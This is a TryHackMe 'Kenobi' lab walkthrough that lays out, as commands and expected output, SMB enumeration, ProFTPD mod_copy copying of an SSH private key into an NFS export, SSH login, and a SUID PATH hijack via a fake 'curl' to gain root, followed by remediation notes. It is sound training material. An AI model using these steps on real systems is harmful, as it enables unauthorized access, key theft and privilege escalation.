# TryHackMe - Kenobi Writeup

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux (Ubuntu)  
**Attack Chain:** SMB Enumeration → ProFTPD mod_copy → NFS Exfil → SSH → SUID PATH Hijack

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [SMB Enumeration](#2-smb-enumeration)
3. [ProFTPD Exploitation — mod_copy](#3-proftpd-exploitation--mod_copy)
4. [NFS Exfiltration](#4-nfs-exfiltration)
5. [SSH Access — User Flag](#5-ssh-access--user-flag)
6. [Privilege Escalation — SUID PATH Hijack](#6-privilege-escalation--suid-path-hijack)
7. [Root Flag](#7-root-flag)
8. [Full Attack Chain Summary](#8-full-attack-chain-summary)

---

## 1. Reconnaissance

### Nmap Full Service Scan

```bash
sudo nmap -sC -sV -T4 <TARGET_IP>
```

**Key open ports:**

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1|
|80|HTTP|Apache 2.4.41|
|111|rpcbind|2-4|
|139/445|Samba|4.6.2|
|2049|NFS|nfs_acl 3|

**Notable findings:**

- `http-robots.txt` disallows `/admin.html`
- NFS exports visible via rpcbind
- NetBIOS name: `KENOBI` — strongly suggests username `kenobi`

---

## 2. SMB Enumeration

### List Shares Anonymously

```bash
smbclient -L //<TARGET_IP> -N
```

**Expected output:**

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service (kenobi server)
```

### Connect to Anonymous Share

```bash
smbclient //<TARGET_IP>/anonymous -N
```

### Download All Files Recursively

```bash
smbclient //<TARGET_IP>/anonymous -N -c "recurse ON; mget *"
```

### Inspect log.txt

```bash
cat log.txt
```

**Key intelligence extracted:**

- SSH keypair generated and saved to `/home/kenobi/.ssh/id_rsa`
- ProFTPD configuration revealed:
    - Service runs as user `kenobi` and group `kenobi`
    - FTP running on port 21
- SMB anonymous share path: `/home/kenobi/share`

---

## 3. ProFTPD Exploitation — mod_copy

### Banner Grab — Confirm Version

```bash
nc <TARGET_IP> 21
```

**Expected banner:**

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
```

**Vulnerability:** ProFTPD 1.3.5 ships with `mod_copy` enabled by default.  
The `SITE CPFR` and `SITE CPTO` commands allow **unauthenticated file copy** anywhere on the filesystem, running as the service user (`kenobi`).

### Exploit — Copy SSH Key to NFS-Exported Directory

Connect via netcat:

```bash
nc <TARGET_IP> 21
```

Issue the following commands at the FTP prompt:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

**Expected responses:**

```
350 File or directory exists, ready for destination name
250 Copy successful
```

---

## 4. NFS Exfiltration

### Check NFS Exports

```bash
showmount -e <TARGET_IP>
```

**Expected output:**

```
Export list for <TARGET_IP>:
/var *
```

`/var` is exported to all hosts (`*`), and `/var/tmp/id_rsa` was just copied there.

### Mount the NFS Share

```bash
sudo mkdir /mnt/kenobiNFS
sudo mount <TARGET_IP>:/var /mnt/kenobiNFS
```

### Retrieve the Private Key

```bash
ls /mnt/kenobiNFS/tmp/
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

---

## 5. SSH Access — User Flag

### SSH in as Kenobi

```bash
ssh -i id_rsa kenobi@<TARGET_IP>
```

> No passphrase required — the key was generated without one (confirmed in log.txt).

### Grab User Flag

```bash
cat /home/kenobi/user.txt
```

---

## 6. Privilege Escalation — SUID PATH Hijack

### Find Non-Standard SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Suspicious result:** `/usr/bin/menu` — not a standard Linux binary.

### Investigate the Binary

```bash
/usr/bin/menu
```

Note the three menu options (status check, kernel version, ifconfig), then inspect binary strings:

```bash
strings /usr/bin/menu | grep -E "curl|uname|ifconfig|status"
```

**Expected output:**

```
curl -I localhost
uname -r
ifconfig
```

**Vulnerability:** All three binaries are called by **relative path**, not absolute path. Since `menu` runs as root via SUID, we can hijack PATH to execute arbitrary code as root.

### Execute the PATH Hijack

```bash
# Create malicious binary named 'curl'
echo /bin/bash > /tmp/curl
chmod +x /tmp/curl

# Prepend /tmp to PATH  ← note the leading /
export PATH=/tmp:$PATH

# Trigger the SUID binary
/usr/bin/menu
```

Select option `1` (status check → calls `curl`).

> ⚠️ **Common Mistake:** Typing `export PATH=tmp:$PATH` (missing leading `/`) will fail silently — the real `curl` will be found instead of your fake one. Always verify with `echo $PATH`.

---

## 7. Root Flag

After selecting option 1, a root shell spawns:

```bash
whoami
# root

cat /root/root.txt
```

---

## 8. Full Attack Chain Summary

```
SMB Anonymous Share
        ↓
   log.txt leak
   → /home/kenobi/.ssh/id_rsa location
   → ProFTPD 1.3.5 running as kenobi
        ↓
ProFTPD mod_copy (unauthenticated)
   SITE CPFR /home/kenobi/.ssh/id_rsa
   SITE CPTO /var/tmp/id_rsa
        ↓
NFS Export (/var exported to *)
   Mount → copy id_rsa locally
        ↓
SSH as kenobi (no passphrase)
   → user.txt
        ↓
SUID /usr/bin/menu
   → relative path calls (curl, uname, ifconfig)
   → PATH hijack via /tmp/curl
        ↓
Root shell
   → root.txt
```

---

## Tools Used

|Tool|Purpose|
|---|---|
|`nmap`|Port and service enumeration|
|`smbclient`|SMB share enumeration and file retrieval|
|`nc`|ProFTPD mod_copy exploitation|
|`showmount`|NFS export enumeration|
|`mount`|NFS share mounting|
|`find`|SUID binary discovery|
|`strings`|Binary analysis for PATH hijack|
|`ssh`|Remote access|

---

## Remediation Notes

|Vulnerability|Fix|
|---|---|
|SMB anonymous share|Disable guest access, remove anonymous share|
|ProFTPD mod_copy|Upgrade to 1.3.6+, or disable mod_copy in config|
|NFS world export|Restrict `/var` export to specific trusted IPs|
|SSH key in exposed share path|Never generate keys in or adjacent to shared directories|
|SUID binary with relative paths|Use absolute paths in all system binaries; audit SUID regularly|